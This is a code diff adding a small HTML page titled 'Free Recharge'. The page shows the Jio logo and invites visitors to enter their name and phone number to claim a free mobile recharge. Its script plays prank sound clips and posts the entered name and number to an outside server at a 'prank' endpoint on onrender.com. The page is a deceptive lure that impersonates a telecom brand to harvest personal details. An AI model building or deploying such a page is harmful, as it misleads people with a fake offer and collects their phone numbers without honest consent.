@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Recharge</title>
+  <style>
+    * {
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    div {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 70px;
+      gap: 30px;
+    }
+
+    #jiologo {
+      width: 200px;
+    }
+
+    #imgg {
+      width: 100%;
+      max-width: 300px;
+    }
+
+    button {
+      width: 100%;
+      max-width: 300px;
+      color: white;
+      padding: 10px;
+      border-radius: 50px;
+      background-color: #0f3cc9;
+    }
+
+    input {
+      padding: 20px;
+      width: 100%;
+      max-width: 300px;
+    }
+  </style>
+</head>
+
+<body>
+  <div>
+    <img id="jiologo" src="https://1000logos.net/wp-content/uploads/2021/07/Jio-Logo.png" />
+    <img id="imgg"
+      src="data:image/jpeg;base64,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"
+      alt="play">
+    <input id="name" placeholder="Enter Your Name" />
+    <input id="number" type="number" placeholder="Enter Your Number" />
+    <button id="imgg2">Get Free Recharge</button>
+    <br />
+  </div>
+</body>
+<script>
+  let audio = new Audio("./macchar.mp3");
+  let audio1 = new Audio("./yamete.mp3");
+  document.getElementById("imgg").onclick = () => audio.play()
+
+
+  let nameInput = document.getElementById("name");
+  let numberInput = document.getElementById("number")
+
+  function sendData() {
+    let name = nameInput.value;
+    let number = numberInput.value;
+    console.log(number, name)
+    const url = "https://prank-a4ao.onrender.com/postData"
+    const data = {
+      name: name,
+      number: number
+    };
+    console.log(data)
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data)
+    })
+      .then(response => {
+        console.log(response)
+      })
+  }
+  document.getElementById("imgg2").onclick = () => {
+    audio1.play();
+    sendData()
+  }
+</script>
+
+</html>
